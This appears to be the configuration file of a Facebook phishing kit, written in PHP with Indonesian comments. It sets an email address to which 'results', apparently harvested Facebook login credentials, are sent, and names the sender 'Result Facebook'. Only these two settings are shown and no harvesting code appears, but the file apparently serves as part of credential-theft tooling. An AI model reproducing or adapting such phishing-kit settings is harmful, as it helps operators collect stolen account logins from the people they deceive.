<?php
$emailku = 'uncheckfbgrupwa@gmail.com'; // email tujuan utntuk dikirim result //
$pengirim = 'Result Facebook'; // nama yg muncul di result sebagai pengirim //
?>